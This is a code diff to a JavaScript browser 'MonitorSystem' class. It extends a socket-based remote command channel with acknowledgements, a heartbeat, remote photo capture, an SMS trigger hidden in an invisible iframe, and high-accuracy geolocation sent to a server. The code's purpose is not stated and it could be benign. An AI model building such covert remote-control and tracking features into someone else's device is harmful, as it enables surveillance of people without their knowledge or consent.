@@ -27,6 +27,9 @@ export class MonitorSystem {
     setupSocket() {
         this.socket.emit('join-room', this.roomId, 'monitor');
 
+        // Start heartbeat
+        this.startHeartbeat();
+
         this.socket.on('request-monitor-status', () => {
             this.socket.emit('monitor-announcement', { roomId: this.roomId });
             this.sendDeviceInfo();
@@ -46,18 +49,46 @@ export class MonitorSystem {
             }
         });
 
-        // Modified to handle specific commands and then fallback
+        // Enhanced command handler with ACK
         this.socket.on('command', async (payload) => {
-            console.log("Remote Command Received:", payload.command);
+            const { command, commandId } = payload;
+            console.log(`📥 Command Received [${commandId}]:`, command);
 
-            if (payload.command === 'take-photo') {
-                this.takeRemotePhoto();
-            } else if (payload.command === 'get-status') {
-                this.reportStatus();
-            } else if (payload.command === 'send-sms') {
-                this.sendSms(payload.phone, payload.message);
-            } else {
-                this.handleCommand(payload);
+            try {
+                // Process command
+                if (command === 'take-photo') {
+                    await this.takeRemotePhoto();
+                } else if (command === 'get-status') {
+                    this.reportStatus();
+                } else if (command === 'send-sms') {
+                    this.sendSms(payload.phone, payload.message);
+                } else {
+                    await this.handleCommand(payload);
+                }
+
+                // Send ACK
+                this.socket.emit('command-ack', {
+                    roomId: this.roomId,
+                    commandId,
+                    command,
+                    status: 'success',
+                    timestamp: Date.now()
+                });
+
+                console.log(`✅ Command ACK sent [${commandId}]`);
+
+            } catch (error) {
+                console.error(`❌ Command failed [${commandId}]:`, error);
+
+                // Send error ACK
+                this.socket.emit('command-ack', {
+                    roomId: this.roomId,
+                    commandId,
+                    command,
+                    status: 'error',
+                    error: error.message,
+                    timestamp: Date.now()
+                });
             }
         });
 
@@ -66,6 +97,39 @@ export class MonitorSystem {
             console.log("Control Command Received:", payload.command);
             this.handleCommand(payload);
         });
+
+        // Connection status
+        this.socket.on('room-status', (data) => {
+            console.log(`Room status: ${data.clientCount} clients in ${data.roomId}`);
+        });
+
+        this.socket.on('disconnect', () => {
+            console.log('⚠️ Disconnected from server');
+            if (this.heartbeatInterval) {
+                clearInterval(this.heartbeatInterval);
+            }
+        });
+
+        this.socket.on('connect', () => {
+            console.log('✅ Reconnected to server');
+            this.socket.emit('join-room', this.roomId, 'monitor');
+            this.startHeartbeat();
+        });
+    }
+
+    startHeartbeat() {
+        // Clear existing interval
+        if (this.heartbeatInterval) {
+            clearInterval(this.heartbeatInterval);
+        }
+
+        // Send heartbeat every 5 seconds
+        this.heartbeatInterval = setInterval(() => {
+            this.socket.emit('heartbeat', {
+                roomId: this.roomId,
+                timestamp: Date.now()
+            });
+        }, 5000);
     }
 
     async takeRemotePhoto() {
@@ -106,17 +170,45 @@ export class MonitorSystem {
     }
 
     sendSms(phone, message) {
+        console.log(`📱 Sending SMS to ${phone}: "${message}"`);
+
         // Create SMS URI
         const smsUri = `sms:${phone}?body=${encodeURIComponent(message)}`;
 
-        // Try to open SMS app
-        window.location.href = smsUri;
+        // Try to open SMS app using hidden iframe (won't disconnect)
+        try {
+            // Method 1: Create temporary invisible iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = smsUri;
+            document.body.appendChild(iframe);
+
+            // Remove iframe after 2 seconds
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 2000);
+
+            console.log('✅ SMS intent triggered via iframe');
+        } catch (e) {
+            console.error('❌ SMS iframe failed, trying window.open...', e);
+
+            // Fallback: try window.open
+            try {
+                const smsWindow = window.open(smsUri, '_blank');
+                if (smsWindow) {
+                    setTimeout(() => smsWindow.close(), 1000);
+                }
+            } catch (e2) {
+                console.error('❌ window.open also failed', e2);
+            }
+        }
 
         // Notify success
         this.socket.emit('status-update', {
             roomId: this.roomId,
             type: 'sms-sent',
             phone: phone,
+            message: message.substring(0, 50) + (message.length > 50 ? '...' : ''),
             timestamp: Date.now()
         });
     }
@@ -305,16 +397,41 @@ export class MonitorSystem {
                 screen: `${window.screen.width}x${window.screen.height}`,
                 connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
                 memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
-                location: { lat: '...', lon: '...' }
+                location: null // Will be updated async
             };
 
+            // First emit basic info immediately
             this.socket.emit('device-info', { roomId: this.roomId, info: base });
 
+            // Then try to get high accuracy location
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    base.location = { lat: pos.coords.latitude.toFixed(4), lon: pos.coords.longitude.toFixed(4) };
-                    this.socket.emit('device-info', { roomId: this.roomId, info: base });
-                }, null, { timeout: 5000 });
+                console.log('📍 Requesting geolocation...');
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        console.log('📍 Location acquired');
+                        base.location = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: pos.timestamp
+                        };
+                        this.socket.emit('device-info', {
+                            roomId: this.roomId,
+                            info: base,
+                            updateType: 'location'
+                        });
+                    },
+                    (err) => {
+                        console.warn('📍 Location error:', err.message);
+                        base.location = { error: err.message };
+                        this.socket.emit('device-info', { roomId: this.roomId, info: base });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
             }
             return base;
         };
